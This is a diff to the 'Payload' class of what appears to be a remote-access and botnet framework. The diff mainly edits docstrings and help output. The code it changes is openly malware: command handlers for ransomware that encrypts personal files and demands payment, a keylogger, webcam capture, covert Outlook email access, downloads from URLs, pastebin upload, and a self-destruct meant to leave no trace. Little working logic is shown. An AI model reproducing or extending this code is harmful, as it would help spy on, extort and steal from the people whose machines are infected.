@@ -332,7 +332,7 @@ class Payload():
     @config(platforms=['win32','linux2','darwin'], command=True, usage='wget <url>')
     def wget(self, url, filename=None):
         """
-        Download file from url as temporary file and return filepath
+        Download file from URL
 
         `Required`
         :param str url:         target URL to download ('http://...')
@@ -353,7 +353,7 @@ class Payload():
     @config(platforms=['win32','linux2','darwin'], command=True, usage='kill')
     def kill(self):
         """
-        Shutdown the current connection and reset session
+        Shutdown the current connection
 
         """
         try:
@@ -379,12 +379,12 @@ class Payload():
         """
         if not name:
             try:
-                return {getattr(self, cmd).usage: getattr(self, cmd).func_doc for cmd in vars(self) if hasattr(getattr(self, cmd), 'command') if getattr(getattr(self, cmd), 'command')}
+                return json.dumps({v.usage: v.func_doc.strip('\n').splitlines()[0].lower() for k,v in vars(Payload).items() if callable(v) if hasattr(v, 'command') if getattr(v, 'command')})
             except Exception as e:
                 log("{} error: {}".format(self.help.func_name, str(e)))
-        elif hasattr(self, name):
+        elif hasattr(Payload, name) and hasattr(getattr(Payload, name), 'command'):
             try:
-                return help(getattr(self, name))
+                return json.dumps({getattr(Payload, name).usage: getattr(Payload, name).func_doc})
             except Exception as e:
                 log("{} error: {}".format(self.help.func_name, str(e)))
         else:
@@ -479,7 +479,7 @@ class Payload():
     @config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
     def abort(self, *args):
         """
-        Abort tasks, close connection, and self-destruct leaving no trace on the disk
+        abort execution and self-destruct
 
         """
         globals()['_abort'] = True
@@ -595,7 +595,7 @@ class Payload():
     @config(platforms=['win32','linux2','darwin'], registry_key=r"Software\BYOB", command=True, usage='ransom <mode> [path]')
     def ransom(self, args):
         """
-        Ransom personal files on the client host machine using encryption
+        Encrypt personal files on client machine
 
         `Required`
         :param str mode:        encrypt, decrypt, payment
@@ -609,7 +609,7 @@ class Payload():
     @config(platforms=['win32','linux2','darwin'], command=True, usage='webcam <mode> [options]')
     def webcam(self, args=None):
         """
-        View a live stream of the client host machine webcam or capture image/video
+        Capture image/video from client webcam
 
         `Required`
         :param str mode:      stream, image, video
@@ -651,8 +651,7 @@ class Payload():
     @config(platforms=['win32','linux2','darwin'], command=True, usage='passive')
     def passive(self):
         """
-        Enter passive mode, re-attempting to establish a connection
-        with the server every 30 seconds
+        Keep client alive while waiting to re-establish connection
 
         """
         self.flags['connection'].clear()
@@ -675,7 +674,7 @@ class Payload():
     @config(platforms=['win32','darwin'], command=True, usage='outlook <option> [mode]')
     def outlook(self, args=None):
         """
-        Access Outlook email in the background without authentication
+        Access Outlook email in the background
 
         `Required`
         :param str mode:    installed, run, count, search, upload
@@ -825,7 +824,7 @@ class Payload():
         except Exception as e:
             return '{} error: {}'.format(self.pastebin.func_name, str(e))
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='keylogger run/stop/status/upload')
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='keylogger [mode]')
     def keylogger(self, mode=None):
         """
         Log user keystrokes
